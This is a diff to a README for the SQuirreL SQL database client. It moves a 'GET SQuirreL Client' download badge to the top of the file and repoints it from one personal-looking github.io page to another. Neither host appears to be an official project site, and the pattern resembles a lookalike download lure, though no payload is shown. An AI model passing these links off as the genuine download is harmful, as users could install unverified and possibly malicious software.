@@ -27,6 +27,8 @@ The grid below is a working map of engines you open through SQuirreL SQL drivers
 | Cassandra, MongoDB, Redis, ClickHouse, DuckDB | JDBC or plugin if you have one | Optional extras | |
 | Trino / Presto | JDBC | Optional extras | |
 
+[![GET SQuirreL Client](https://img.shields.io/badge/GET-SQuirreL%20Client-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://squirrel-client.github.io/SQuirreL-SQL/)
+
 Driver rows in the Swing list are [DriversList.java](FILES/core/DriversList.java). Alias rows are [AliasesList.java](FILES/core/AliasesList.java). The manager that ties both is [AliasesAndDriversManager.java](FILES/core/AliasesAndDriversManager.java).
 
 ## Editions of SQuirreL
@@ -222,8 +224,6 @@ Editor helpers in this pack include CodeMirrorPlugins.ts. Native bridges sit in 
 ![Grid](editor/image3.png)
 
 ## Download
-
-[![GET SQuirreL Client](https://img.shields.io/badge/GET-SQuirreL%20Client-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://gregorianudelman.github.io/.github/SQuirreL-Client)
 
 Use the GET badge for this pack. SQuirreL SQL also ships installer jars and zip packages from the Ant output. You need a JRE (Java 17 or newer on current stables). Add a JDBC jar on the Drivers tab, then create an alias. Do not paste a machine-local URL into this page; use the host and port your engine actually listens on.
 
